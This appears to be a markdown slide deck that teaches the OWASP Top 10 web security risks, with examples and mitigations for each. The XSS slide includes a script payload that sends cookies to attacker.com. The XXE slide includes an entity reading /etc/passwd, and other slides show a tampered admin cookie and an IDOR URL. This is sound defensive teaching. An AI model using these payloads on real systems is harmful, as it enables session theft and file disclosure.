# TOP 10 SECURITY ISSUES

Number X will surprise you!

Note:
Fill in which number

---

# Said who?

## OWASP

Note:
Short time here, just go to next slide for detailed summary

+++

## What is OWASP

The Open Web Application Security Project

Note:
The Open Web Application Security Project - open community which is dedicated to enabling organizations
to develop, purchase and maintain applications which can be trusted. Non-profit, almost everyone is volunteer.

---

## Where does the data come from?

- 40+ data submissions from security companies |
- 515 individuals |
- Data spans 100k applications |

Note:
The OWASP Top 10 for 2017 is based primarily on 40+ data submissions from firms that specialize in application security and an
industry survey that was completed by 515 individuals. This data spans vulnerabilities gathered from hundreds of organizations and
over 100,000 real-world applications and APIs.

---

# Insufficient Logging and Monitoring
Number 10

+++

## What's that?

+++

Insufficient logging and monitoring, along with ineffective incident response allows 
attackers to further attack systems, maintain persistence, pivot to more systems,
and tamper with data.

+++

## How do I fight it?

- All login, access control failures and input validation failures should be logged |
- Establish effective monitoring and alerting |
- Establish / adopt incident response and recovery plan |

---

# Using Components with Known Vulnerabilities
Number 9

+++

## What's that?

Components (ex. libraries, frameworks) run with the same
privileges as the application. If a vulnerable component is exploited, such an attack can facilitate
serious data loss or server takeover.

+++

## How do I fight it?
<li class="fragment">Keep your dependencies up to date (tools: [versions](http://www.mojohaus.org/versions-maven-plugin/), [OWASP DependencyCheck](https://www.owasp.org/index.php/OWASP_Dependency_Check), [retire.js](https://github.com/retirejs/retire.js/))</li>
<li class="fragment">Monitor sources like [Common Vulnerabilities and Exposures](https://cve.mitre.org/) and [National Vulnerability Database](https://nvd.nist.gov/) </li>
- Get packages from official sources and prefer signed packages |
<li class="fragment">If update is not possible, consider using [virtual patch](https://www.owasp.org/index.php/Virtual_Patching_Best_Practices#What_is_a_Virtual_Patch.3F)</li>

+++

# What is virtual patch?

A security policy enforcement layer which prevents the exploitation of a known vulnerability.
The virtual patch works since the security enforcement layer analyzes transactions and intercepts attacks in transit, so malicious traffic never reaches the web application. 

---

# Insecure Deserialization
Number 8

+++

## What's that?

Insecure deserialization flaws occur when an application receives hostile serialized objects.
Insecure deserialization leads to remote code execution.

Note:
Maybe add example here, as "what's that" may not be clear

+++

### Example:

A forum uses object serialization to save a cookie containing user ID, role, password hash.

```json
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```
@[4-5](Attacker changes the object to give themselves admin privileges)

+++

## How do I fight it?

The only safe architectural pattern is to not accept serialized
objects from untrusted sources or to use serialization mediums
that only permit primitive data types.

---

# Cross-Site Scripting (XSS)
Number 7

+++

## What's that?

XSS flaws occur whenever an application includes untrusted data in a new web page without
proper validation or escaping, or updates an existing web page with user supplied data using a
browser API that can create JavaScript.

+++

### Example:

The application uses untrusted data in the construction of the
following HTML snippet without validation or escaping

```java
(String) page += "<input name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'>";

'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.
```
@[4-6](The attacker modifies the ‘CC’ parameter in his browser)


+++

## How do I fight it?
- Use safe frameworks that automatically escape for XSS by design (ex. ReactJS) |
- Validate inputs |
- Escape outputs |

Note:
Links: https://www.owasp.org/index.php/Abridged_XSS_Prevention_Cheat_Sheet
---

# Security Misconfiguration
Number 6

+++

## What's that?

Title says it all, but for ### example:
- insecure default configurations |
- open S3 buckets |
- misconfigured HTTP headers |
- error messages containing sensitive information |
- not patching or upgrading systems, frameworks, dependencies, and components in a timely fashion (or at all) |

+++

### Example:

The app server admin console is automatically installed and not removed.

+++

## How do I fight it?

- A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down. |
- Dev, QA and prod environments should be configured identically (With different credentials obviously) |
- Remove unused dependencies and frameworks | 
- Update as fast as possible (See Number 9) |
- Automated verification process |

---

# Broken Access Control
Number 5

+++

## What's that?

Restrictions on what authenticated users are allowed to do are not properly enforced. Attackers can
exploit these flaws to access unauthorized functionality and/or data.

+++

### Example:

```java
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

http://example.com/app/accountInfo?acct=notmyacct
```
@[1-2](The application uses unverified data in a SQL call that is accessing account information)
@[4](An attacker simply modifies the 'acct' parameter)

+++

## How do I fight it?

- With the exception of public resources, deny by default |
- Implement access control mechanisms once and re-use them throughout the application |
- Disable web server directory listing, ensure file metadata (ex. .git) is not present within web roots |
- Log access control failures |
- Rate limiting API to minimize the harm from automated attack tooling |
- Access control unit and integration tests |

---

# XML External Entities (XEE)
Number 4

+++

## What's that?

External entities can be used to disclose internal files using the file URI handler,
internal SMB file shares on unpatched Windows servers, internal port scanning, remote code
execution, and denial of service attacks.

+++

### Example:

The attacker attempts to extract data from the server

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>

```

+++

## How do I fight it?

- Developer training is essential to identify and mitigate XXE completely |
- Disable XML external entity and DTD processing |
- Validate inputs |
- Patch or upgrade all the latest XML processors and libraries |
- Upgrade SOAP to the latest version |
- If these controls are not possible, consider using virtual patching |

---

# Sensitive Data Exposure
Number 3

+++

## What's that?

Many web applications and APIs do not properly protect sensitive data. Sensitive data deserves extra protection such as
encryption at rest or in transit, as well as special precautions when exchanged with the browser.

+++

### Example:

An application encrypts credit card numbers in a database using automatic database encryption. However, this
data is automatically decrypted when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text.

+++

## How do I fight it?

- Discard sensitive data as soon as possible |
- Make sure you encrypt all sensitive data at REST |
- Encrypt all data in transit |
- Ensure up-to-date and strong standard algorithms or ciphers |
- Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt) |
- Disable caching for response that contain sensitive data |

---

# Broken Authentication
Number 2

+++

## What's that?

Application functions related to authentication and session management are often implemented
incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit
other implementation flaws to assume other users’ identities

+++

### Example:

Credential stuffing, is a common attack. If an application does not rate limit authentication attempts, 
the application can be used as a password oracle to determine if the credentials are valid

Note:
Credential stuffing -> the use of lists of known passwords

+++

## How do I fight it?

- Do not deploy with any default credentials |
- Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt) |
- Implement password checks against [top 10000 worst passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords) |
- Where possible, implement multi-factor authentication |
- Log authentication failures |
- Align password length, complexity and rotation policies with [NIST 800-63 B's guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) |

Note:
NIST -> National Institute of Standards and Technology
---

# Injection
Number 1

+++

## What's that?

Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an
interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into
executing unintended commands or accessing data without proper authorization.

+++

### Example:

![Relevant XKCD](assets/injection_maymay.png)

+++

## How do I fight it?

Valudate your inputs

---

That's all folks!